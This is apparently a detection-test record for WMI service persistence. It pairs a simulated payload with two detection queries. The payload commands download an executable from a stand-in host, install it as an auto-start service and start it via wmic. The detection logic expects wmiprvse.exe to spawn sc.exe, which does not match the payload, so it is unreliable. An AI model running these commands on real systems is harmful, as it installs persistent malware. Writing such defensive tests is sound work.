identity.name: Abusing WMI for Persistence via System Service
identity.summary: An attacker uses WMI to create a persistent system service that executes a malicious payload. Cortex detects this behavior through the launch of a commonly abused process (wmiprvse.exe) as a system se
identity.description: An attacker uses WMI to create a persistent system service that executes a malicious payload. Cortex detects this behavior through the launch of a commonly abused process (wmiprvse.exe) as a system service, which is a known tactic for maintaining access.

techniques.name: Create or Modify System Process: Windows Service

payload.code:
mkdir C:\temp

curl -o C:\temp\malware.exe https://malware-feed.example.com/malware.exe

sc create MaliciousService binPath= "C:\temp\malware.exe" start= auto

sc config MaliciousService binPath= "C:\temp\malware.exe"

wmic service where "name='MaliciousService'" call startservice

expected_artifacts.description: Execution of wmiprvse.exe as a system service
Creation of a malicious service binary

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Commonly Abused Process Launched as System Service
biocs.description: Detection of wmiprvse.exe being started as a system service, a behavior often abused by attackers for persistence.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'wmiprvse.exe'
| filter action_process_image_name = 'sc.exe'
| filter causality_actor_process_image_name = 'system'

abiocs.name: Suspicious WMI Service Launch
abiocs.description: Behavioral deviation where wmiprvse.exe is launched as a system service with a non-standard binary path, indicating potential abuse.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'wmiprvse.exe'
| filter action_process_image_name = 'sc.exe'
| filter causality_actor_process_image_name = 'system'
| filter action_file_path = 'C:\temp\malware.exe'
